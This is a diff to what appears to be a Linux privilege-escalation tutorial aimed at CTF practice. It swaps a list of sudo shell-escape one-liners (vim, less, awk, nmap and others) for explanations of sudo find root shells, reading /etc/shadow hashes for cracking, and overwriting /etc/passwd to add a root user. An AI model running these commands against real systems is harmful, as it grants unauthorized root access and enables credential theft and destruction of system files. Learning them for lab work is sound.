@@ -160,134 +160,62 @@ Now, back on the remote host, run the file. For bash / sh, use the -p command li
 
 Shell Escape Sequences
 ----------------------
-
+Check Current Sudo Privileges
+To check your current permissions related to sudo, you can use the following command:
 
     $ sudo -l
-    Matching Defaults entries for user on this host:
-        env_reset, env_keep+=LD_PRELOAD
+This will list the commands a user is allowed to run with sudo privileges. Based on this, an attacker may find a vulnerability to escalate privileges.
+If a user has the ability to execute a command with sudo but doesn't have access to everything, we can search for payloads to leverage this.
+search for payloads in https://gtfobins.github.io/
 
-    User user may run the following commands on this host:
-        (root) NOPASSWD: /usr/sbin/iftop
-        (root) NOPASSWD: /usr/bin/find
-        (root) NOPASSWD: /usr/bin/nano
-        (root) NOPASSWD: /usr/bin/vim
-        (root) NOPASSWD: /usr/bin/man
-        (root) NOPASSWD: /usr/bin/awk
-        (root) NOPASSWD: /usr/bin/less
-        (root) NOPASSWD: /usr/bin/ftp
-        (root) NOPASSWD: /usr/bin/nmap
-        (root) NOPASSWD: /usr/sbin/apache2
-        (root) NOPASSWD: /bin/more
+Exploit with Sudo
+Assuming you can execute find with sudo, you can use the following command to spawn a shell with root privileges:
 
-vim / vi
-^^^^^^^^
+    sudo find . -exec /bin/sh \; -quit
+![image](https://github.com/user-attachments/assets/1d174aff-f610-476e-bb4e-bb3d723280f9)
+This command forces find to run a shell (/bin/sh) as root by using sudo. The -quit flag ensures that the find command stops executing immediately after spawning the shell.
 
+Find Common Exploitable Binaries
+Some binaries may be configured to allow root access when used with sudo. For example:
 
-    $ sudo vim --cmd sh
-    #
-
-    $ sudo vi --cmd sh
-    #
+nano:
+/usr/bin/nano is often a text editor installed on many Linux systems. If a user can run nano with root privileges, they can edit sensitive files, such as /etc/passwd.
+![image](https://github.com/user-attachments/assets/e9e7c340-4896-4fe7-afec-00e1eb021b86)
 
 
-    $ sudo vim -c sh
-    #
+less:
+Similarly, less is a pager program, often used to view files. If improperly configured, it may allow privilege escalation:
+![image](https://github.com/user-attachments/assets/ab8e392c-17f0-4c1e-be1d-61092cd8d27f)
 
-    $ sudo vi -c sh
-    #
+Find the Flag
+After successfully escalating privileges, you can search the system for the flag (or other sensitive files):
 
+    find / -name flag.txt 2>/dev/null
+Here, we look for a file called flag.txt and suppress any error messages.
+![image](https://github.com/user-attachments/assets/d8883e72-a1a1-4fb4-bd40-dc2c3c781e46)
 
-    $ sudo vim
-    :!sh
-    #
+Find the Hash of Frank's Password
+If the password file has been compromised or altered, you can often find hashes of user passwords, including Frank’s password:
 
-    $ sudo vi
-    :!sh
-    #
-
-man
-^^^
-
-
-    $ sudo man ls
-    !sh
-    #
-
-less
-^^^^
+      cat /etc/shadow | grep frank
+Once you find the hash, you can try cracking it using tools like John the Ripper or Hashcat.
+![image](https://github.com/user-attachments/assets/4ba1ec66-b320-40c7-8b8d-0d2d5fe25a1e)
 
 
-    $ sudo less /path/to/large/file
-    !sh
-    #
+Overwriting Files (Risky)
+Warning: This command will overwrite important system files like /etc/passwd — don’t use this in production systems! This is useful only for Capture the Flag (CTF) scenarios or safe environments.
 
-more
-^^^^
+Here’s how you can potentially overwrite the /etc/passwd file to give yourself root access:
+*** THIS WILL OVERWRITE THE PASSWD FILE, NOT A GOOD PRACTICE FOR CTF ***
 
+    LFILE=/etc/passwd
+    DATA='siren:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:siren:/home/siren:/bin/bash\n'
+    sudo find / -maxdepth 0 -fprintf "$LFILE" "$DATA"
+Explanation:
 
-    $ sudo more /path/to/large/file
-    !sh
-    #
+This command creates a new user called siren in the /etc/passwd file with root privileges by adding a new line.
 
-iftop
-^^^^^
-
-
-    $ sudo iftop
-    !sh
-    #
-
-gdb
-^^^
-
-
-    $ sudo gdb
-    (gdb) shell sh
-    #
-
-ftp
-^^^
-
-
-    $ ftp
-    ftp> !
-    #
-
-find
-^^^^
-
-
-    $ sudo find /bin -name ls -exec /bin/sh \;
-    #
-
-awk
-^^^
-
-
-    $ sudo awk 'BEGIN {system("/bin/sh")}'
-    #
-
-nmap
-^^^^
-
-
-    $ sudo nmap --interactive
-    !sh
-    #
-
-
-    $ echo "os.execute('/bin/sh')" > shell.nse
-    $ sudo nmap --script=shell.nse
-    #
-
-nano
-^^^^
-
-
-    $ sudo nano -s /bin/sh
-    sh
-    ^T
-
+This could allow you to access the system as the siren user with root access. However, remember that overwriting critical system files can be dangerous.
 Abusing Intended Functionality
 ------------------------------
 
